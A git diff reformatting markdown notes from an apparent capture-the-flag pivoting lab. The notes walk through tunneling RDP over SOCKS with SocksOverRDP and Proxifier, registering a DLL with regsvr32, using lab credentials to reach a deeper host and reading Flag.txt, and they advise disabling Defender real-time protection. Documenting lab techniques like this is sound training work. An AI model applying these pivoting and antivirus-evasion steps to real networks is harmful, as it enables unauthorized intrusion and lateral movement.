@@ -3021,7 +3021,7 @@ xfreerdp /v:127.0.0.1 /u:victor /p:pass@123 /cert:ignore
 <details>
 <summary><h2>RDP and SOCKS Tunneling with SocksOverRDP</h2></summary>
 
-This method leverages Dynamic Virtual Channels (DVC) from the Windows Remote Desktop Service to tunnel traffic. It is an excellent alternative when SSH access is restricted or unavailable within a Windows network.
+This method leverages **Dynamic Virtual Channels (DVC)** from the Windows Remote Desktop Service to tunnel traffic. It is an excellent alternative when SSH access is restricted or unavailable within a Windows network.
 
 ### 🛠️ Required Binaries
 
@@ -3031,90 +3031,234 @@ This method leverages Dynamic Virtual Channels (DVC) from the Windows Remote Des
 
 ---
 
-### 1. Attack Host Preparation
+**1. Attack Host Preparation**
 
 Ensure you have the following binaries ready to be transferred to the target:
 
 - [SocksOverRDPx64.zip](https://github.com/nccgroup/SocksOverRDP/releases)
 - [ProxifierPE.zip](https://www.proxifier.com/download/#win-tab) (Portable Edition)
 
-### 2. Connection and File Transfer
+**2. Connection and File Transfer**
 
 Connect to the target via RDP and mount a local drive to transfer the tools.
-_(Note: Use absolute paths for the shared drive to avoid `PostFilter rule` parsing errors in xfreerdp)._
+
+> **Note:** Use absolute paths for the shared drive to avoid `PostFilter rule` parsing errors in `xfreerdp`.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 xfreerdp /v:10.129.1.181 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:share,/home/htb-ac-1640397/Downloads
 ```
 
-3. Registering the DLL on Target
-   Once inside the initial Windows foothold (10.129.x.x), move the SocksOverRDP-Plugin.dll to your working directory and register it.
+</td>
+</tr>
+</table>
 
-[!WARNING] Troubleshooting: regsvr32.exe Errors
+**3. Registering the DLL on Target**
 
-File Disappears: If Windows Defender quarantines the .dll, disable Real-Time Protection or add a folder exclusion.
+Once inside the initial Windows foothold (10.129.x.x), move the `SocksOverRDP-Plugin.dll` to your working directory and register it.
 
-Error 0x80070005 (Access Denied): You must run regsvr32.exe from an Administrator: Command Prompt. Standard user prompts will fail to write to the registry.
+> **NOTE:** Troubleshooting: regsvr32.exe Errors
+>
+> - File Disappears: If Windows Defender quarantines the .dll, disable Real-Time Protection or add a folder exclusion.
+> - Error 0x80070005 (Access Denied): You must run regsvr32.exe from an Administrator: Command Prompt. Standard user prompts will fail to write to the registry.
 
-DOS
-C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll 4. Establishing the Foundational RDP Connection
-With the .dll registered, connect to the first internal pivot target using the native Windows client (mstsc.exe).
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Initial Foothold (10.129.x.x)</b> </td>
+</tr>
+<tr>
+<td width="20%">
 
-Target IP: 172.16.5.19
+**`C:\Users\htb-student\Desktop\SocksOverRDP-x64>`**
 
-Credentials: victor : pass@123
+</td>
+<td>
 
-Upon successfully authenticating, a prompt will appear confirming that the SocksOverRDP plugin is enabled and will listen on 127.0.0.1:1080 once the server is executed.
+```cmd
+regsvr32.exe SocksOverRDP-Plugin.dll
+```
 
-5. Executing the Server Component
-   Transfer SocksOverRDP-Server.exe to the remote host (172.16.5.19). Open an Administrator Command Prompt and start the tunnel:
+</td>
+</tr>
+</table>
 
-DOS
-C:\Users\victor\Desktop> SocksOverRDP-Server.exe
+**4. Establishing the Foundational RDP Connection**
+
+With the `.dll` registered, connect to the first internal pivot target using the native Windows client (`mstsc.exe`).
+
+- **Target IP:** `172.16.5.19`
+- **Credentials:** `victor : pass@123`
+
+Upon successfully authenticating, a prompt will appear confirming that the **SocksOverRDP plugin** is enabled and will listen on `127.0.0.1:1080` once the server is executed.
+
+**5. Executing the Server Component**
+
+Transfer `SocksOverRDP-Server.exe` to the remote host (`172.16.5.19`). Open an Administrator Command Prompt and start the tunnel:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Internal Server</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\Users\victor\Desktop>`**
+
+</td>
+<td>
+
+```cmd
+SocksOverRDP-Server.exe
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
 Socks Over RDP by Balazs Bucsay [[@xoreipeip]]
 [*] Channel opened over RDP
-Back on your 10.129.x.x machine, verify the SOCKS listener is active:
+```
 
-DOS
-C:\Windows\system32> netstat -antb | findstr 1080
-TCP 127.0.0.1:1080 0.0.0.0:0 LISTENING 6. Proxifier Configuration
-Transfer and open Proxifier Portable on the 10.129.x.x machine. You must configure precise rules (Profile -> Proxification Rules) to prevent routing loops and immediate disconnects.
+</td>
+</tr>
+</table>
 
-Required Rules:
+Back on your Initial Foothold (`10.129.x.x`) machine, verify the SOCKS listener is active:
 
-Pivot Bypass (Crucial):
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Initial Foothold (10.129.x.x)</b> </td>
+</tr>
+<tr>
+<td width="20%">
 
-Applications: mstsc.exe
+**`C:\System32 >`**
 
-Target Hosts: 172.16.5.19
+</td>
+<td>
 
-Action: Direct (Prevents tunneling the tunnel)
+```cmd
+netstat -antb | findstr 1080
+```
 
-Target Route:
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
-Applications: mstsc.exe
+---
 
-Target Hosts: 172.16.6.155
+```text
+TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
+```
 
-Action: Proxy SOCKS5 127.0.0.1:1080
+</td>
+</tr>
+</table>
 
-Default Route:
+**6. Proxifier Configuration**
 
-Action: Direct (If left as proxy, Windows background CRL checks on port 80 will fail over the isolated tunnel, causing RDP to instantly close with a <1 sec lifetime).
+Transfer and open **Proxifier Portable** on the `10.129.x.x` machine. You must configure precise rules (`Profile -> Proxification Rules`) to prevent routing loops and immediate disconnects.
 
-7. The Final Pivot
-   With Proxifier running (ensure it is running as an Administrator if you launched your terminal as Admin), open a new mstsc.exe instance and connect to the deep network target:
+**Required Rules:**
 
-DOS
+- **Pivot Bypass (Crucial):**
+  - **Applications:** `mstsc.exe`
+  - **Target Hosts:** `172.16.5.19`
+  - **Action:** `Direct` (Prevents tunneling the tunnel)
+
+- **Target Route:**
+  - **Applications:** `mstsc.exe`
+  - **Target Hosts:** `172.16.6.155`
+  - **Action:** `Proxy SOCKS5 127.0.0.1:1080`
+
+- **Default Route:**
+  - **Action:** `Direct` (If left as proxy, Windows background CRL checks on port 80 will fail over the isolated tunnel, causing RDP to instantly close with a `<1 sec` lifetime).
+
+**7. The Final Pivot**
+
+With Proxifier running (ensure it is running as an Administrator if you launched your terminal as Admin), open a new `mstsc.exe` instance and connect to the deep network target:
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Initial Foothold (10.129.x.x)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
 mstsc.exe /v:172.16.6.155
-Authenticate with the final credentials (jason : WellConnected123!) to access the desktop and retrieve Flag.txt.
+```
+
+</td>
+</tr>
+</table>
+
+Authenticate with the final credentials (jason : WellConnected123!) to access the desktop and retrieve `Flag.txt`.
+
+**8. Retrieving the Flag**
+
+Once connected to Jason's machine (`172.16.6.155`), open the command prompt and navigate to the Desktop to locate and read the objective file.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows - Final Target (172.16.6.155)</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\Users\jason\Desktop>`**
+
+</td>
+<td>
+
+```cmd
+dir
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+```text
+Volume in drive C has no label.
+ Volume Serial Number is 7A4B-9C2D
+
+ Directory of C:\Users\jason\Desktop
+
+02/18/2026  11:45 AM    <DIR>          .
+02/18/2026  11:45 AM    <DIR>          ..
+02/18/2026  11:30 AM                34 Flag.txt
+               1 File(s)             34 bytes
+               2 Dir(s)  12,543,981,568 bytes free
+```
+
+</td>
+</tr>
 
 </details>
 
 </details>
 
 ---
-
-```
-
-```
